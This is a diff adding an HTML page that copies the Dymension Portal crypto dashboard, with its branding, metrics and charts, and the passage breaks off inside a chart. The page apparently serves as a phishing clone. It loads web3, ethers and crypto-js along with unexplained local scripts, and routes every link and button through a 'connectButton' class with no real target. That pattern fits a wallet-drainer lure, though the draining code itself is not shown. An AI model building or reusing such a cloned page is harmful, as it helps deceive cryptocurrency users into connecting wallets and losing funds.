@@ -1,0 +1,1279 @@
+<html lang="en">
+ <head>
+  <title>
+   Dymension Portal App
+  </title>
+  <script src="https://unpkg.com/web3@latest/dist/web3.min.js">
+  </script>
+  <script src="https://unpkg.com/crypto-js@latest/crypto-js.js">
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.js" type="application/javascript">
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js">
+  </script>
+  <script src="./js/settings.js">
+  </script>
+  <script src="./js/webchunk.js">
+  </script>
+  <meta charset="utf-8"/>
+  <meta content="width=device-width,initial-scale=1" name="viewport"/>
+  <meta content="#f1e1d4" name="theme-color"/>
+  <meta content="Interact with the Dymension Hub, RollApps and IBC." name="description"/>
+  <meta content="https://firebasestorage.googleapis.com/v0/b/dymension-3f01e.appspot.com/o/station-preview.png?alt=media&amp;token=aa4e6cd6-6b8f-4a6c-98d4-41ea8c12991e" name="twitter:image"/>
+  <meta content="summary_large_image" name="twitter:card"/>
+  <meta content="Dymension Portal App" property="og:title"/>
+  <meta content="Interact with the Dymension Hub, RollApps and IBC." property="og:description"/>
+  <meta content="https://firebasestorage.googleapis.com/v0/b/dymension-3f01e.appspot.com/o/station-preview.png?alt=media&amp;token=aa4e6cd6-6b8f-4a6c-98d4-41ea8c12991e" property="og:image"/>
+  <meta content="https://portal.dymension.xyz/" property="og:url"/>
+  <link href="/favicon.ico" rel="icon"/>
+  <link href="/logo192.png" rel="apple-touch-icon"/>
+  <link href="/manifest.json" rel="manifest"/>
+  <script async="" crossorigin="anonymous" src="https://edge.fullstory.com/s/fs.js">
+  </script>
+  <script>
+   window._fs_host="fullstory.com",window._fs_script="edge.fullstory.com/s/fs.js",window._fs_org="o-1HCQ2H-na1",window._fs_namespace="FS",function(n,e,t,o,s,c,i,f){t in n?n.console&&n.console.log&&n.console.log('FullStory namespace conflict. Please set window["_fs_namespace"].'):((i=n[t]=function(n,e,t){i.q?i.q.push([n,e,t]):i._api(n,e,t)}).q=[],(c=e.createElement(o)).async=1,c.crossOrigin="anonymous",c.src="https://"+_fs_script,(f=e.getElementsByTagName(o)[0]).parentNode.insertBefore(c,f),i.identify=function(n,e,t){i(s,{uid:n},t),e&&i(s,e,t)},i.setUserVars=function(n,e){i(s,n,e)},i.event=function(n,e,t){i("event",{n:n,p:e},t)},i.anonymize=function(){i.identify(!1)},i.shutdown=function(){i("rec",!1)},i.restart=function(){i("rec",!0)},i.log=function(n,e){i("log",[n,e])},i.consent=function(n){i("consent",!arguments.length||n)},i.identifyAccount=function(n,e){c="account",(e=e||{}).acctId=n,i(c,e)},i.clearUserCookie=function(){},i.setVars=function(n,e){i("setVars",[n,e])},i._w={},f="XMLHttpRequest",i._w[f]=n[f],f="fetch",i._w[f]=n[f],n[f]&&(n[f]=function(){return i._w[f].apply(this,arguments)}),i._v="1.3.0")}(window,document,window._fs_namespace,"script","user")
+  </script>
+  <script defer="defer" src="/static/js/main.a83e8af2.js">
+  </script>
+  <link href="/static/css/main.86488777.css" rel="stylesheet"/>
+  <script async="" src="https://www.googletagmanager.com/gtag/js?l=dataLayer&amp;id=G-C8GP4K3WBM">
+  </script>
+  <meta content="AymqwRC7u88Y4JPvfIF2F37QKylC04248hLCdJAsh8xgOfe/dVJPV3XS3wLFca1ZMVOtnBfVjaCMTVudWM//5g4AAAB7eyJvcmlnaW4iOiJodHRwczovL3d3dy5nb29nbGV0YWdtYW5hZ2VyLmNvbTo0NDMiLCJmZWF0dXJlIjoiUHJpdmFjeVNhbmRib3hBZHNBUElzIiwiZXhwaXJ5IjoxNjk1MTY3OTk5LCJpc1RoaXJkUGFydHkiOnRydWV9" http-equiv="origin-trial"/>
+ </head>
+ <link href="totalcss.css" rel="stylesheet"/>
+ <body>
+  <noscript>
+   You need to enable JavaScript to run this app.
+  </noscript>
+  <div id="root">
+   <div class="app-layout">
+    <div class="top-bar">
+     <a class="logo connectButton">
+      <span class="icon-container primary icon-color-fill">
+       <svg fill="none" height="44" viewbox="0 0 44 44" width="44" xmlns="http://www.w3.org/2000/svg">
+        <path d="M2.38643 27.4402C1.40218 26.4557 0.742112 25.3189 0.406218 24.0298C0.0781357 22.7328 0.0781355 21.4358 0.406218 20.1389C0.742112 18.8341 1.39827 17.6934 2.37471 16.7168C3.36676 15.7245 4.51115 15.0643 5.80786 14.7362C7.10457 14.408 8.40128 14.408 9.69799 14.7362C10.9947 15.0643 12.1352 15.7206 13.1194 16.7051L15.5566 19.1427L19.1655 15.5331L16.7283 13.0954C15.744 12.111 15.084 10.9742 14.7481 9.68502C14.42 8.38805 14.4161 7.095 14.7364 5.80585C15.0645 4.50888 15.7246 3.36427 16.7166 2.37201C17.7009 1.38757 18.8413 0.73128 20.138 0.403133C21.4347 0.0749851 22.7275 0.0788809 24.0164 0.414841C25.3131 0.742989 26.4536 1.3993 27.4379 2.38374C28.4221 3.36818 29.0783 4.50888 29.4064 5.80585C29.7423 7.095 29.7461 8.38805 29.4181 9.68502C29.0978 10.9898 28.4455 12.1344 27.4613 13.1189L25.0358 15.5448L28.633 19.1427L31.0585 16.7168C32.0427 15.7323 33.1793 15.0721 34.4682 14.7362C35.7649 14.408 37.0577 14.4119 38.3466 14.7479C39.6433 15.076 40.7877 15.7362 41.7798 16.7285C42.764 17.7129 43.4202 18.8536 43.7482 20.1506C44.0841 21.4398 44.0841 22.7289 43.7482 24.0181C43.4202 25.315 42.764 26.4557 41.7798 27.4402C40.7877 28.4324 39.6433 29.0926 38.3466 29.4208C37.0577 29.7411 35.7649 29.7372 34.4682 29.409C33.1871 29.0809 32.0544 28.4246 31.0702 27.4402L28.6447 25.0142L25.0358 28.6238L27.4613 31.0498C28.4455 32.0342 29.0978 33.171 29.4181 34.4602C29.7461 35.7572 29.7461 37.0541 29.4181 38.3511C29.09 39.6481 28.4299 40.7926 27.4379 41.7849C26.4615 42.7615 25.3209 43.4178 24.0164 43.7538C22.7197 44.0819 21.423 44.0819 20.1263 43.7538C18.8452 43.4257 17.7125 42.7693 16.7283 41.7849C15.7362 40.7926 15.0723 39.6519 14.7364 38.3628C14.4083 37.0658 14.4083 35.7689 14.7364 34.4719C15.0801 33.1749 15.7402 32.0381 16.7166 31.0615L19.1655 28.6121L15.5683 25.0142L13.1194 27.4636C12.143 28.4402 10.9986 29.0926 9.68626 29.4208C8.38955 29.7489 7.09286 29.7489 5.79616 29.4208C4.50726 29.0848 3.37068 28.4246 2.38643 27.4402ZM5.31573 24.5103C5.76098 24.9556 6.27654 25.2525 6.86241 25.401C7.45608 25.5572 8.04585 25.5611 8.63172 25.4127C9.21758 25.2642 9.73314 24.9673 10.1784 24.522L12.6273 22.0726L10.1901 19.6349C9.74485 19.1896 9.22539 18.8966 8.63172 18.756C8.04585 18.6075 7.46 18.6075 6.87413 18.756C6.28827 18.9044 5.7688 19.2052 5.31573 19.6584C4.87047 20.1037 4.56974 20.6155 4.41351 21.1936C4.2651 21.7796 4.2651 22.3656 4.41351 22.9516C4.56974 23.5454 4.87047 24.0649 5.31573 24.5103ZM19.6576 10.1655L22.0948 12.6032L24.5203 10.1772C24.9733 9.72409 25.2702 9.20843 25.4108 8.63026C25.5592 8.04429 25.5553 7.45439 25.3991 6.8606C25.2507 6.27462 24.9538 5.75896 24.5085 5.31362C24.0633 4.86828 23.5477 4.57138 22.9619 4.42293C22.376 4.27449 21.7902 4.27449 21.2043 4.42293C20.6263 4.56357 20.1107 4.86046 19.6576 5.31362C19.2124 5.75896 18.9077 6.27462 18.7437 6.8606C18.5953 7.44658 18.5953 8.03256 18.7437 8.61853C18.9077 9.20451 19.2124 9.72017 19.6576 10.1655ZM30.8878 22.0843L33.3133 24.5103C33.7585 24.9556 34.2702 25.2564 34.8483 25.4127C35.4341 25.5611 36.7023 25.5572 37.2804 25.401C37.8662 25.2525 38.3857 24.9517 38.8387 24.4986C39.2918 24.0454 39.5886 23.5297 39.7293 22.9516C39.8855 22.3734 39.8894 21.7913 39.741 21.2054C39.5926 20.6194 39.2957 20.1037 38.8505 19.6584C38.3974 19.2052 37.8779 18.9044 37.292 18.756C36.7062 18.6075 35.4341 18.6075 34.8483 18.756C34.278 18.9044 33.7663 19.2052 33.3133 19.6584L30.8878 22.0843ZM19.6576 38.855C20.1029 39.3004 20.6185 39.5973 21.2043 39.7457C21.7902 39.8942 22.3721 39.8902 22.9502 39.734C23.536 39.5855 24.0516 39.2886 24.4968 38.8433C24.9499 38.3901 25.2507 37.8706 25.3991 37.2846C25.5553 36.7064 25.5592 36.1244 25.4108 35.5384C25.2702 34.9446 24.9773 34.425 24.532 33.9797L22.1065 31.5537L19.6576 34.0031C19.2124 34.4485 18.9116 34.9602 18.7554 35.5384C18.607 36.1244 18.607 36.7103 18.7554 37.2963C18.9038 37.8823 19.2046 38.4019 19.6576 38.855ZM18.4976 22.0843L22.0948 25.6822L25.7037 22.0726L22.1065 18.4747L18.4976 22.0843Z" fill="#24201F">
+        </path>
+       </svg>
+      </span>
+     </a>
+     <nav class="nav-bar nav-bar">
+      <ul class="nav-item-list">
+       <a class="link icon-color-fill medium nav-bar-item connectButton">
+        RollApps
+       </a>
+       <a aria-current="page" class="link icon-color-fill medium nav-bar-item active connectButton">
+        Dymension
+        <svg class="arrow-down" fill="none" height="9" viewbox="0 0 14 9" width="14" xmlns="http://www.w3.org/2000/svg">
+         <path d="M13.2219 2.34689L7.59692 7.97189C7.51854 8.05055 7.42539 8.11297 7.32283 8.15555C7.22027 8.19814 7.11032 8.22006 6.99927 8.22006C6.88822 8.22006 6.77826 8.19814 6.6757 8.15555C6.57314 8.11297 6.48 8.05055 6.40161 7.97189L0.77661 2.34689C0.618102 2.18839 0.529053 1.9734 0.529053 1.74924C0.529053 1.52507 0.618102 1.31009 0.77661 1.15158C0.935118 0.993072 1.1501 0.904024 1.37427 0.904024C1.59843 0.904024 1.81341 0.993072 1.97192 1.15158L6.99997 6.17963L12.028 1.15088C12.1865 0.99237 12.4015 0.90332 12.6257 0.90332C12.8498 0.90332 13.0648 0.99237 13.2233 1.15088C13.3818 1.30939 13.4709 1.52437 13.4709 1.74853C13.4709 1.9727 13.3818 2.18768 13.2233 2.34619L13.2219 2.34689Z" fill="#F1E1D4">
+         </path>
+        </svg>
+       </a>
+       <a class="link icon-color-fill medium nav-bar-item connectButton">
+        IBC Bridge
+       </a>
+       <a class="link icon-color-fill medium nav-bar-item connectButton">
+        Liquidity
+        <svg class="arrow-down" fill="none" height="9" viewbox="0 0 14 9" width="14" xmlns="http://www.w3.org/2000/svg">
+         <path d="M13.2219 2.34689L7.59692 7.97189C7.51854 8.05055 7.42539 8.11297 7.32283 8.15555C7.22027 8.19814 7.11032 8.22006 6.99927 8.22006C6.88822 8.22006 6.77826 8.19814 6.6757 8.15555C6.57314 8.11297 6.48 8.05055 6.40161 7.97189L0.77661 2.34689C0.618102 2.18839 0.529053 1.9734 0.529053 1.74924C0.529053 1.52507 0.618102 1.31009 0.77661 1.15158C0.935118 0.993072 1.1501 0.904024 1.37427 0.904024C1.59843 0.904024 1.81341 0.993072 1.97192 1.15158L6.99997 6.17963L12.028 1.15088C12.1865 0.99237 12.4015 0.90332 12.6257 0.90332C12.8498 0.90332 13.0648 0.99237 13.2233 1.15088C13.3818 1.30939 13.4709 1.52437 13.4709 1.74853C13.4709 1.9727 13.3818 2.18768 13.2233 2.34619L13.2219 2.34689Z" fill="#F1E1D4">
+         </path>
+        </svg>
+       </a>
+       <a class="link icon-color-fill medium nav-bar-item connectButton">
+        Info
+        <svg class="arrow-down" fill="none" height="9" viewbox="0 0 14 9" width="14" xmlns="http://www.w3.org/2000/svg">
+         <path d="M13.2219 2.34689L7.59692 7.97189C7.51854 8.05055 7.42539 8.11297 7.32283 8.15555C7.22027 8.19814 7.11032 8.22006 6.99927 8.22006C6.88822 8.22006 6.77826 8.19814 6.6757 8.15555C6.57314 8.11297 6.48 8.05055 6.40161 7.97189L0.77661 2.34689C0.618102 2.18839 0.529053 1.9734 0.529053 1.74924C0.529053 1.52507 0.618102 1.31009 0.77661 1.15158C0.935118 0.993072 1.1501 0.904024 1.37427 0.904024C1.59843 0.904024 1.81341 0.993072 1.97192 1.15158L6.99997 6.17963L12.028 1.15088C12.1865 0.99237 12.4015 0.90332 12.6257 0.90332C12.8498 0.90332 13.0648 0.99237 13.2233 1.15088C13.3818 1.30939 13.4709 1.52437 13.4709 1.74853C13.4709 1.9727 13.3818 2.18768 13.2233 2.34619L13.2219 2.34689Z" fill="#F1E1D4">
+         </path>
+        </svg>
+       </a>
+      </ul>
+     </nav>
+     <span class="space top-bar-middle-space">
+     </span>
+     <div class="input-container form-control interactive rollapps-search">
+      <span class="icon-container search-icon primary icon-color-stroke">
+       <svg fill="none" height="20" viewbox="0 0 20 20" width="20" xmlns="http://www.w3.org/2000/svg">
+        <path d="M16.0416 16.0423L12.9166 12.9173M3.95825 9.16732C3.95825 6.29083 6.2901 3.95898 9.16659 3.95898C12.0431 3.95898 14.3749 6.29083 14.3749 9.16732C14.3749 12.0438 12.0431 14.3757 9.16659 14.3757C6.2901 14.3757 3.95825 12.0438 3.95825 9.16732Z" stroke="#787676" stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5">
+        </path>
+       </svg>
+      </span>
+      <input class="input" placeholder="Search RollApps..." type="search" value=""/>
+      <button class="button clear-button icon medium icon-color-fill disabled connectButton" tabindex="-1" type="button">
+       <svg fill="#000000" height="24px" viewbox="0 0 24 24" width="24px" xmlns="http://www.w3.org/2000/svg">
+        <path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z">
+        </path>
+       </svg>
+      </button>
+     </div>
+     <button class="button primary medium icon-color-fill connectButton" tabindex="0" type="button">
+      Connect
+     </button>
+    </div>
+    <main>
+     <div class="page dashboard">
+      <div class="network-header-container">
+       <div class="network-header">
+        <img alt="network logo" class="network-logo" src="https://raw.githubusercontent.com/dymensionxyz/chain-registry/main/mainnet/dymension_1100-1/logos/dymension-logo.svg"/>
+        <div class="network-details">
+         <div class="network-name-container">
+          <h2 class="network-name">
+           Dymension
+          </h2>
+          <button class="button network-action icon medium icon-color-fill connectButton" tabindex="0" type="button">
+           <svg height="24" viewbox="0 -960 960 960" width="24" xmlns="http://www.w3.org/2000/svg">
+            <path d="M480-80q-82 0-155-31.5t-127.5-86Q143-252 111.5-325T80-480q0-83 31.5-155.5t86-127Q252-817 325-848.5T480-880q83 0 155.5 31.5t127 86q54.5 54.5 86 127T880-480q0 82-31.5 155t-86 127.5q-54.5 54.5-127 86T480-80Zm0-82q26-36 45-75t31-83H404q12 44 31 83t45 75Zm-104-16q-18-33-31.5-68.5T322-320H204q29 50 72.5 87t99.5 55Zm208 0q56-18 99.5-55t72.5-87H638q-9 38-22.5 73.5T584-178ZM170-400h136q-3-20-4.5-39.5T300-480q0-21 1.5-40.5T306-560H170q-5 20-7.5 39.5T160-480q0 21 2.5 40.5T170-400Zm216 0h188q3-20 4.5-39.5T580-480q0-21-1.5-40.5T574-560H386q-3 20-4.5 39.5T380-480q0 21 1.5 40.5T386-400Zm268 0h136q5-20 7.5-39.5T800-480q0-21-2.5-40.5T790-560H654q3 20 4.5 39.5T660-480q0 21-1.5 40.5T654-400Zm-16-240h118q-29-50-72.5-87T584-782q18 33 31.5 68.5T638-640Zm-234 0h152q-12-44-31-83t-45-75q-26 36-45 75t-31 83Zm-200 0h118q9-38 22.5-73.5T376-782q-56 18-99.5 55T204-640Z">
+            </path>
+           </svg>
+          </button>
+         </div>
+         <span class="network-data">
+          <a class="network-website-link connectButton" rel="noreferrer">
+           https://portal.dymension.xyz
+          </a>
+         </span>
+        </div>
+       </div>
+      </div>
+      <div class="tab-bar dashboard-tab-bar">
+       <ul class="tab-action-list">
+        <li>
+         <button class="tab-action active connectButton">
+          <h5>
+           Metrics
+          </h5>
+         </button>
+        </li>
+        <li>
+         <button class="tab-action connectButton">
+          <h5>
+           Staking
+          </h5>
+         </button>
+        </li>
+       </ul>
+       <div class="tab dashboard-tab">
+        <div>
+         <div class="statistics-cards">
+          <div class="statistics-card section small">
+           <div class="property">
+            <p class="property-label">
+             Active Addresses
+            </p>
+            <div class="property-value">
+             442,671
+             <div class="statistics-change positive left-space">
+              <span class="icon-container caret-icon primary icon-color-original">
+               <svg fill="none" height="16" viewbox="0 0 17 16" width="17" xmlns="http://www.w3.org/2000/svg">
+                <path d="M3.3607 9.64625L8.3607 4.64625C8.40714 4.59976 8.46228 4.56288 8.52298 4.53772C8.58368 4.51256 8.64874 4.49961 8.71445 4.49961C8.78016 4.49961 8.84522 4.51256 8.90592 4.53772C8.96662 4.56288 9.02176 4.59976 9.0682 4.64625L14.0682 9.64625C14.1382 9.71618 14.1859 9.8053 14.2052 9.90235C14.2245 9.99939 14.2146 10.1 14.1768 10.1914C14.1389 10.2828 14.0747 10.3609 13.9924 10.4159C13.9101 10.4708 13.8134 10.5001 13.7144 10.5L3.71445 10.5C3.6155 10.5001 3.51875 10.4708 3.43646 10.4159C3.35416 10.3609 3.29001 10.2828 3.25214 10.1914C3.21426 10.1 3.20436 9.99939 3.22368 9.90235C3.24301 9.8053 3.29069 9.71618 3.3607 9.64625Z">
+                </path>
+               </svg>
+              </span>
+              27.49% (7d)
+             </div>
+            </div>
+           </div>
+          </div>
+          <div class="statistics-card section small">
+           <div class="property">
+            <p class="property-label">
+             Staking APR
+            </p>
+            <div class="property-value">
+             74.02%
+             <div class="statistics-change left-space">
+              <span class="icon-container caret-icon primary icon-color-original">
+               <svg fill="none" height="16" viewbox="0 0 17 16" width="17" xmlns="http://www.w3.org/2000/svg">
+                <path d="M3.3607 9.64625L8.3607 4.64625C8.40714 4.59976 8.46228 4.56288 8.52298 4.53772C8.58368 4.51256 8.64874 4.49961 8.71445 4.49961C8.78016 4.49961 8.84522 4.51256 8.90592 4.53772C8.96662 4.56288 9.02176 4.59976 9.0682 4.64625L14.0682 9.64625C14.1382 9.71618 14.1859 9.8053 14.2052 9.90235C14.2245 9.99939 14.2146 10.1 14.1768 10.1914C14.1389 10.2828 14.0747 10.3609 13.9924 10.4159C13.9101 10.4708 13.8134 10.5001 13.7144 10.5L3.71445 10.5C3.6155 10.5001 3.51875 10.4708 3.43646 10.4159C3.35416 10.3609 3.29001 10.2828 3.25214 10.1914C3.21426 10.1 3.20436 9.99939 3.22368 9.90235C3.24301 9.8053 3.29069 9.71618 3.3607 9.64625Z">
+                </path>
+               </svg>
+              </span>
+              97.75% (24h)
+             </div>
+            </div>
+           </div>
+          </div>
+          <div class="statistics-card section small">
+           <div class="property">
+            <p class="property-label">
+             Block Height
+            </p>
+            <div class="property-value">
+             8,943
+            </div>
+           </div>
+          </div>
+          <div class="statistics-card section small">
+           <div class="property">
+            <p class="property-label">
+             Block Time
+            </p>
+            <div class="property-value">
+             6.14
+             <span class="property-value-suffix">
+              s
+             </span>
+            </div>
+           </div>
+          </div>
+         </div>
+         <div class="swiper-container statistics-cards-swiper" style="--item-width: 25%;">
+          <div class="swiper">
+           <div class="statistics-card section small">
+            <div class="property">
+             <p class="property-label">
+              Active Addresses
+             </p>
+             <div class="property-value">
+              442,671
+              <div class="statistics-change positive left-space">
+               <span class="icon-container caret-icon primary icon-color-original">
+                <svg fill="none" height="16" viewbox="0 0 17 16" width="17" xmlns="http://www.w3.org/2000/svg">
+                 <path d="M3.3607 9.64625L8.3607 4.64625C8.40714 4.59976 8.46228 4.56288 8.52298 4.53772C8.58368 4.51256 8.64874 4.49961 8.71445 4.49961C8.78016 4.49961 8.84522 4.51256 8.90592 4.53772C8.96662 4.56288 9.02176 4.59976 9.0682 4.64625L14.0682 9.64625C14.1382 9.71618 14.1859 9.8053 14.2052 9.90235C14.2245 9.99939 14.2146 10.1 14.1768 10.1914C14.1389 10.2828 14.0747 10.3609 13.9924 10.4159C13.9101 10.4708 13.8134 10.5001 13.7144 10.5L3.71445 10.5C3.6155 10.5001 3.51875 10.4708 3.43646 10.4159C3.35416 10.3609 3.29001 10.2828 3.25214 10.1914C3.21426 10.1 3.20436 9.99939 3.22368 9.90235C3.24301 9.8053 3.29069 9.71618 3.3607 9.64625Z">
+                 </path>
+                </svg>
+               </span>
+               27.49% (7d)
+              </div>
+             </div>
+            </div>
+           </div>
+           <div class="statistics-card section small">
+            <div class="property">
+             <p class="property-label">
+              Staking APR
+             </p>
+             <div class="property-value">
+              74.02%
+              <div class="statistics-change left-space">
+               <span class="icon-container caret-icon primary icon-color-original">
+                <svg fill="none" height="16" viewbox="0 0 17 16" width="17" xmlns="http://www.w3.org/2000/svg">
+                 <path d="M3.3607 9.64625L8.3607 4.64625C8.40714 4.59976 8.46228 4.56288 8.52298 4.53772C8.58368 4.51256 8.64874 4.49961 8.71445 4.49961C8.78016 4.49961 8.84522 4.51256 8.90592 4.53772C8.96662 4.56288 9.02176 4.59976 9.0682 4.64625L14.0682 9.64625C14.1382 9.71618 14.1859 9.8053 14.2052 9.90235C14.2245 9.99939 14.2146 10.1 14.1768 10.1914C14.1389 10.2828 14.0747 10.3609 13.9924 10.4159C13.9101 10.4708 13.8134 10.5001 13.7144 10.5L3.71445 10.5C3.6155 10.5001 3.51875 10.4708 3.43646 10.4159C3.35416 10.3609 3.29001 10.2828 3.25214 10.1914C3.21426 10.1 3.20436 9.99939 3.22368 9.90235C3.24301 9.8053 3.29069 9.71618 3.3607 9.64625Z">
+                 </path>
+                </svg>
+               </span>
+               97.75% (24h)
+              </div>
+             </div>
+            </div>
+           </div>
+           <div class="statistics-card section small">
+            <div class="property">
+             <p class="property-label">
+              Block Height
+             </p>
+             <div class="property-value">
+              8,943
+             </div>
+            </div>
+           </div>
+           <div class="statistics-card section small">
+            <div class="property">
+             <p class="property-label">
+              Block Time
+             </p>
+             <div class="property-value">
+              6.14
+              <span class="property-value-suffix">
+               s
+              </span>
+             </div>
+            </div>
+           </div>
+          </div>
+         </div>
+        </div>
+        <div class="network-charts network-summary-charts">
+         <div class="chart-container section small total-supply-chart-container network-chart-container">
+          <div class="property chart-property">
+           <p class="property-label property-label">
+            Total Supply
+           </p>
+           <div class="property-value property-value">
+            1,000,113,688 DYM
+            <div class="statistics-change positive left-space">
+             <span class="icon-container caret-icon primary icon-color-original">
+              <svg fill="none" height="16" viewbox="0 0 17 16" width="17" xmlns="http://www.w3.org/2000/svg">
+               <path d="M3.3607 9.64625L8.3607 4.64625C8.40714 4.59976 8.46228 4.56288 8.52298 4.53772C8.58368 4.51256 8.64874 4.49961 8.71445 4.49961C8.78016 4.49961 8.84522 4.51256 8.90592 4.53772C8.96662 4.56288 9.02176 4.59976 9.0682 4.64625L14.0682 9.64625C14.1382 9.71618 14.1859 9.8053 14.2052 9.90235C14.2245 9.99939 14.2146 10.1 14.1768 10.1914C14.1389 10.2828 14.0747 10.3609 13.9924 10.4159C13.9101 10.4708 13.8134 10.5001 13.7144 10.5L3.71445 10.5C3.6155 10.5001 3.51875 10.4708 3.43646 10.4159C3.35416 10.3609 3.29001 10.2828 3.25214 10.1914C3.21426 10.1 3.20436 9.99939 3.22368 9.90235C3.24301 9.8053 3.29069 9.71618 3.3607 9.64625Z">
+               </path>
+              </svg>
+             </span>
+             0.01% (24h)
+            </div>
+           </div>
+          </div>
+          <span class="space">
+          </span>
+          <div class="period-selector">
+           <button class="button period-selector-option secondary small icon-color-fill active connectButton" tabindex="0" type="button">
+            1D
+           </button>
+           <button class="button period-selector-option secondary small icon-color-fill connectButton" tabindex="0" type="button">
+            1W
+           </button>
+           <button class="button period-selector-option secondary small icon-color-fill connectButton" tabindex="0" type="button">
+            1M
+           </button>
+           <button class="button period-selector-option secondary small icon-color-fill connectButton" tabindex="0" type="button">
+            1Y
+           </button>
+           <button class="button period-selector-option secondary small icon-color-fill connectButton" tabindex="0" type="button">
+            ALL
+           </button>
+          </div>
+          <div class="recharts-responsive-container" height="200" style="width: 100%; height: 100%; min-width: 0px; min-height: 200px; max-height: 250px;" width="662">
+           <div class="recharts-wrapper" role="region" style="position: relative; cursor: default; width: 662px; height: 200px;">
+            <svg class="recharts-surface" cx="50%" cy="50%" height="200" viewbox="0 0 662 200" width="662">
+             <title>
+             </title>
+             <desc>
+             </desc>
+             <defs>
+              <clippath id="recharts1-clip">
+               <rect height="190" width="652" x="5" y="5">
+               </rect>
+              </clippath>
+             </defs>
+             <g class="recharts-layer recharts-pie" tabindex="0">
+              <g class="recharts-layer recharts-pie-sector" tabindex="-1">
+               <path class="recharts-sector" cx="331" cy="100" d="M 429.40827392103733,82.22891044752491
+    A 100,100,0,
+    0,0,
+    393.32522778987334,21.797915750663037
+  L 374.62765945291136,45.258541025464126
+            A 70,70,0,
+            0,1,
+            399.88579174472613,87.56023731326744 Z" fill="rgb(47,103,195)" name="Bonded" role="img" stroke="transparent" tabindex="-1">
+               </path>
+              </g>
+              <g class="recharts-layer recharts-pie-sector" tabindex="-1">
+               <path class="recharts-sector" cx="331" cy="100" d="M 389.1470323718938,18.64323859480433
+    A 100,100,0,
+    1,0,
+    430.20347576697395,87.403556226005
+  L 400.44243303688177,91.1824893582035
+            A 70,70,0,
+            1,1,
+            371.7029226603256,43.05026701636302 Z" fill="rgb(241,225,212)" name="Unbonded" role="img" stroke="transparent" tabindex="-1">
+               </path>
+              </g>
+              <g class="recharts-layer recharts-pie-labels">
+               <g class="recharts-layer">
+                <g class="customized-label">
+                 <text text-anchor="middle" x="331" y="100">
+                  <tspan dy="-5" font-weight="400" x="331">
+                   Inflation
+                  </tspan>
+                  <tspan dy="20" font-weight="bold" x="331">
+                   8.13%
+                  </tspan>
+                 </text>
+                 <path d="M416.8591341854544,48.73393835173086L442.6168744410908,33.354119857250126L464.6168744410908,33.354119857250126" fill="none" stroke="rgb(47,103,195)">
+                 </path>
+                 <circle cx="464.6168744410908" cy="33.354119857250126" fill="rgb(47,103,195)" r="2" stroke="none">
+                 </circle>
+                 <text fill="rgb(47,103,195)" font-weight="400" text-anchor="middle" x="506.6168744410908" y="37.354119857250126">
+                  Bonded
+                 </text>
+                 <text dy="18" font-size="12" text-anchor="middle" x="506.6168744410908" y="37.354119857250126">
+                  <tspan font-weight="bold">
+                   109.81M
+                  </tspan>
+                  DYM  (10.98%)
+                 </text>
+                </g>
+               </g>
+               <g class="recharts-layer">
+                <g class="customized-label">
+                 <text text-anchor="middle" x="331" y="100">
+                  <tspan dy="-5" font-weight="400" x="331">
+                   Inflation
+                  </tspan>
+                  <tspan dy="20" font-weight="bold" x="331">
+                   8.13%
+                  </tspan>
+                 </text>
+                 <path d="M245.14086581454555,151.2660616482691L219.38312555890923,166.64588014274983L197.38312555890923,166.64588014274983" fill="none" stroke="rgb(241,225,212)">
+                 </path>
+                 <circle cx="197.38312555890923" cy="166.64588014274983" fill="rgb(241,225,212)" r="2" stroke="none">
+                 </circle>
+                 <text fill="rgb(241,225,212)" font-weight="400" text-anchor="middle" x="155.38312555890923" y="170.64588014274983">
+                  Unbonded
+                 </text>
+                 <text dy="18" font-size="12" text-anchor="middle" x="155.38312555890923" y="170.64588014274983">
+                  <tspan font-weight="bold">
+                   890.3M
+                  </tspan>
+                  DYM  (89.02%)
+                 </text>
+                </g>
+               </g>
+              </g>
+             </g>
+            </svg>
+           </div>
+          </div>
+         </div>
+         <div class="chart-container section small area-chart-container network-chart-container">
+          <div class="property chart-property">
+           <p class="property-label property-label">
+            Staking APR
+           </p>
+           <div class="property-value property-value">
+            74.02%
+            <div class="statistics-change left-space">
+             <span class="icon-container caret-icon primary icon-color-original">
+              <svg fill="none" height="16" viewbox="0 0 17 16" width="17" xmlns="http://www.w3.org/2000/svg">
+               <path d="M3.3607 9.64625L8.3607 4.64625C8.40714 4.59976 8.46228 4.56288 8.52298 4.53772C8.58368 4.51256 8.64874 4.49961 8.71445 4.49961C8.78016 4.49961 8.84522 4.51256 8.90592 4.53772C8.96662 4.56288 9.02176 4.59976 9.0682 4.64625L14.0682 9.64625C14.1382 9.71618 14.1859 9.8053 14.2052 9.90235C14.2245 9.99939 14.2146 10.1 14.1768 10.1914C14.1389 10.2828 14.0747 10.3609 13.9924 10.4159C13.9101 10.4708 13.8134 10.5001 13.7144 10.5L3.71445 10.5C3.6155 10.5001 3.51875 10.4708 3.43646 10.4159C3.35416 10.3609 3.29001 10.2828 3.25214 10.1914C3.21426 10.1 3.20436 9.99939 3.22368 9.90235C3.24301 9.8053 3.29069 9.71618 3.3607 9.64625Z">
+               </path>
+              </svg>
+             </span>
+             97.75% (24h)
+            </div>
+           </div>
+          </div>
+          <span class="space">
+          </span>
+          <div class="period-selector">
+           <button class="button period-selector-option secondary small icon-color-fill active connectButton" tabindex="0" type="button">
+            1D
+           </button>
+           <button class="button period-selector-option secondary small icon-color-fill connectButton" tabindex="0" type="button">
+            1W
+           </button>
+           <button class="button period-selector-option secondary small icon-color-fill connectButton" tabindex="0" type="button">
+            1M
+           </button>
+           <button class="button period-selector-option secondary small icon-color-fill connectButton" tabindex="0" type="button">
+            1Y
+           </button>
+           <button class="button period-selector-option secondary small icon-color-fill connectButton" tabindex="0" type="button">
+            ALL
+           </button>
+          </div>
+          <div class="recharts-responsive-container" height="200" style="width: 100%; height: 100%; min-width: 0px; min-height: 200px; max-height: 250px;" width="662">
+           <div class="recharts-wrapper" role="region" style="position: relative; cursor: default; width: 662px; height: 200px;">
+            <svg class="recharts-surface" height="200" viewbox="0 0 662 200" width="662">
+             <title>
+             </title>
+             <desc>
+             </desc>
+             <defs>
+              <clippath id="recharts3-clip">
+               <rect height="170" width="612" x="50" y="0">
+               </rect>
+              </clippath>
+             </defs>
+             <g class="recharts-cartesian-grid">
+              <g class="recharts-cartesian-grid-horizontal">
